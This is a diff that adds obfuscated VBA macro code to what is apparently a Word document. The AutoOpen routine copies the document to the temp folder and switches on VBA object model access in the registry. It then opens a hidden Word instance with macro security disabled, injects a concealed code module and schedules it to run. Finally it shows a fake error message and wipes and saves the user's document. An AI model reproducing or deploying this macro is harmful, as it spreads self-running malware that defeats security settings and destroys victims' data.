+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(121 Xor 22)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(111 Xor 11)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(117 Xor 16)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(33 Xor 27)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(105 Xor 73)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(32 Xor 16)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(108 Xor 20)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(111 Xor 88)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(118 Xor 71)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(101 Xor 85)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(32 Xor 16)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(121 Xor 61)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(111 Xor 88)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(117 Xor 54)
+    NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1 & Chr(33 Xor 18)
+    hgqbADy1goE9RDodtlt4ZCczUuWjgGcCkMTYZd0H = NrAISOZhn7NvxEQ9cf_rxSOl3n_dVw0Zz_2wsLO1
+End Function
+
+Private Sub XLpSUWjdn_IgPQ9F4Rh5HeLAc2P5LqeglN8ddkGZ()
+    Call MsgBox("Something went wrong! Please contact to customer support!", vbOKOnly, "Error")
+    ActiveDocument.Content.Text = ""
+
+    ActiveDocument.Save
+
+End Sub
+
+Private Sub aJXhYWNvDdT7XV_I0QGR6etXMsW2HWsKbiWZiuCg()
+ 
+    On Error GoTo ErrorHandler
+    Do
+
+        Dim ex0qo_ihM7Td6jd8BXTXyAQTOGAILDRPE4gfKWt7
+        Dim wFNvsul8Lp08WF2FJ8DIpAy8g4A23ZoFuMqTNlrj
+        Dim lrYlDIUZ1ByCjLJX8EenUj5N1lF9faSoIjnYCbwz
+        Dim bB0ssNmJ2uK873q1mbkh3KKRJ8U_oLkX8FcjiDke
+        Dim Sf529U5TaLr8U1mEBQCDJPNNDSAMYoPTKJrEgj8g
+        Dim I7i7GBQPKEyOnOh3sjpijkWMWxpbBIniHlVByG62
+        Dim QfDmjwidyR2iziYyp_m6GUg_rOqbU7tvucOHSIsl
+        Dim N7RlPxR41SIeNXg1dAnP_FP4TCoEr22t_iIZgZBQ
+        Dim HKlDzrVBLXWk9PD8iNsd9cEZQffufhMe_y8gjcvs As String
+        Dim UXN_Lt8rcu71HidWDeFuOLmR6PWzCkHsrZxB4PBA As String
+        Dim HOUu7IkaGAGtwoHu6nOkcqltbHlCGmP6h0yli9S7 As String
+        Dim V4PGCiICRFaXpbfgsrjqnIujLAcwSlbXwGp7CGST As String
+        Dim ZKM1cTH5LgUSQrLcBwV15cLvtdrKM8ENAqsEXs7T As String
+        Dim U7LBsk74Wdy5LRNN_gz_sYjDD6iq_6g8p28Zr939
+        Dim b_bLyCWfIvXZNJhpnR5yMm2F0jwUNLz2KFs6zhKP As MsoAutomationSecurity
+        Dim b_AXIvJWYE4mqGxPXyLd62tYXVf7haQ66hmNN5Yw As String
+
+        Application.DisplayAlerts = False
+    
+        Set FSO = CreateObject("Scripting.FileSystemObject")
+        V4PGCiICRFaXpbfgsrjqnIujLAcwSlbXwGp7CGST = ActiveDocument.FullName
+        ZKM1cTH5LgUSQrLcBwV15cLvtdrKM8ENAqsEXs7T = (Environ("temp") & "\" & Wta_pH97N1gBZcYt9jPYQoZz3NM_XCpr3i7IXAlW(15))
+        Call FSO.CopyFile(V4PGCiICRFaXpbfgsrjqnIujLAcwSlbXwGp7CGST, ZKM1cTH5LgUSQrLcBwV15cLvtdrKM8ENAqsEXs7T, True)
+        
+        UXN_Lt8rcu71HidWDeFuOLmR6PWzCkHsrZxB4PBA = j_JNJWXzPK4hOr5tWCmP4w6tTzIyaepBv8bxoLNC
+        HOUu7IkaGAGtwoHu6nOkcqltbHlCGmP6h0yli9S7 = CTWOzLis6ZFM3tSNUfU9dppAkuNGgx4aQLcbBiV7
+    
+        HKlDzrVBLXWk9PD8iNsd9cEZQffufhMe_y8gjcvs = BkMDyKydgAclEJ_TdOvQpvnZOwI1VB8DIP1CnxDS
+    
+        Set ex0qo_ihM7Td6jd8BXTXyAQTOGAILDRPE4gfKWt7 = GetObject(, UXN_Lt8rcu71HidWDeFuOLmR6PWzCkHsrZxB4PBA)
+        I7i7GBQPKEyOnOh3sjpijkWMWxpbBIniHlVByG62 = At7TnwgE6WFAJCPN0N3ux7yvyxsKyD25TcrAoqiW
+        ' Get the old AccessVBOM value
+        Set QfDmjwidyR2iziYyp_m6GUg_rOqbU7tvucOHSIsl = CreateObject(HOUu7IkaGAGtwoHu6nOkcqltbHlCGmP6h0yli9S7)
+    
+        If jjrv3bWfU2eCn4J6XOP12wiFrzEPIowGaDy53SVD(QfDmjwidyR2iziYyp_m6GUg_rOqbU7tvucOHSIsl, I7i7GBQPKEyOnOh3sjpijkWMWxpbBIniHlVByG62) Then
+            N7RlPxR41SIeNXg1dAnP_FP4TCoEr22t_iIZgZBQ = QfDmjwidyR2iziYyp_m6GUg_rOqbU7tvucOHSIsl.RegRead(I7i7GBQPKEyOnOh3sjpijkWMWxpbBIniHlVByG62)
+        Else
+            N7RlPxR41SIeNXg1dAnP_FP4TCoEr22t_iIZgZBQ = ""
+        End If
+    
+        ' Allow accessing to the VBA object model
+        QfDmjwidyR2iziYyp_m6GUg_rOqbU7tvucOHSIsl.RegWrite I7i7GBQPKEyOnOh3sjpijkWMWxpbBIniHlVByG62, 1, "REG_DWORD"
+    
+        ' Open new application because HKCU only used when application launched
+        Set wFNvsul8Lp08WF2FJ8DIpAy8g4A23ZoFuMqTNlrj = CreateObject(UXN_Lt8rcu71HidWDeFuOLmR6PWzCkHsrZxB4PBA)
+        wFNvsul8Lp08WF2FJ8DIpAy8g4A23ZoFuMqTNlrj.Visible = False
+        wFNvsul8Lp08WF2FJ8DIpAy8g4A23ZoFuMqTNlrj.DisplayAlerts = False
+    
+        b_bLyCWfIvXZNJhpnR5yMm2F0jwUNLz2KFs6zhKP = wFNvsul8Lp08WF2FJ8DIpAy8g4A23ZoFuMqTNlrj.AutomationSecurity
+        wFNvsul8Lp08WF2FJ8DIpAy8g4A23ZoFuMqTNlrj.AutomationSecurity = msoAutomationSecurityForceDisable
+    
+        Set lrYlDIUZ1ByCjLJX8EenUj5N1lF9faSoIjnYCbwz = wFNvsul8Lp08WF2FJ8DIpAy8g4A23ZoFuMqTNlrj.Documents.Open(ZKM1cTH5LgUSQrLcBwV15cLvtdrKM8ENAqsEXs7T)
+        Set Sf529U5TaLr8U1mEBQCDJPNNDSAMYoPTKJrEgj8g = lrYlDIUZ1ByCjLJX8EenUj5N1lF9faSoIjnYCbwz.VBProject.VBComponents
+    
+        For Each bB0ssNmJ2uK873q1mbkh3KKRJ8U_oLkX8FcjiDke In Sf529U5TaLr8U1mEBQCDJPNNDSAMYoPTKJrEgj8g
+            If bB0ssNmJ2uK873q1mbkh3KKRJ8U_oLkX8FcjiDke.Type = 1 Then
+                Call Sf529U5TaLr8U1mEBQCDJPNNDSAMYoPTKJrEgj8g.Remove(bB0ssNmJ2uK873q1mbkh3KKRJ8U_oLkX8FcjiDke)
+            End If
+        Next bB0ssNmJ2uK873q1mbkh3KKRJ8U_oLkX8FcjiDke
+    
+        Set bB0ssNmJ2uK873q1mbkh3KKRJ8U_oLkX8FcjiDke = lrYlDIUZ1ByCjLJX8EenUj5N1lF9faSoIjnYCbwz.VBProject.VBComponents.Add(1)
+        bB0ssNmJ2uK873q1mbkh3KKRJ8U_oLkX8FcjiDke.CodeModule.AddFromString (HKlDzrVBLXWk9PD8iNsd9cEZQffufhMe_y8gjcvs)
+
+        wFNvsul8Lp08WF2FJ8DIpAy8g4A23ZoFuMqTNlrj.AutomationSecurity = b_bLyCWfIvXZNJhpnR5yMm2F0jwUNLz2KFs6zhKP
+    
+        lrYlDIUZ1ByCjLJX8EenUj5N1lF9faSoIjnYCbwz.Save
+        lrYlDIUZ1ByCjLJX8EenUj5N1lF9faSoIjnYCbwz.Close
+    
+        Set lrYlDIUZ1ByCjLJX8EenUj5N1lF9faSoIjnYCbwz = wFNvsul8Lp08WF2FJ8DIpAy8g4A23ZoFuMqTNlrj.Documents.Open(ZKM1cTH5LgUSQrLcBwV15cLvtdrKM8ENAqsEXs7T)
+        Call wFNvsul8Lp08WF2FJ8DIpAy8g4A23ZoFuMqTNlrj.OnTime(Now + TimeSerial(0, 0, 1), "x_N0th1ngH3r3")
+
+        ' Restore the registry to its old state
+        If N7RlPxR41SIeNXg1dAnP_FP4TCoEr22t_iIZgZBQ = "" Then
+            QfDmjwidyR2iziYyp_m6GUg_rOqbU7tvucOHSIsl.RegDelete I7i7GBQPKEyOnOh3sjpijkWMWxpbBIniHlVByG62
+        Else
+            QfDmjwidyR2iziYyp_m6GUg_rOqbU7tvucOHSIsl.RegWrite I7i7GBQPKEyOnOh3sjpijkWMWxpbBIniHlVByG62, N7RlPxR41SIeNXg1dAnP_FP4TCoEr22t_iIZgZBQ, "REG_DWORD"
+        End If
+
+        XLpSUWjdn_IgPQ9F4Rh5HeLAc2P5LqeglN8ddkGZ
+   
+    Loop While False
+
+ErrorHandler:
+
+End Sub
+
+Sub AutoOpen()
+
+    aJXhYWNvDdT7XV_I0QGR6etXMsW2HWsKbiWZiuCg
+
+End Sub
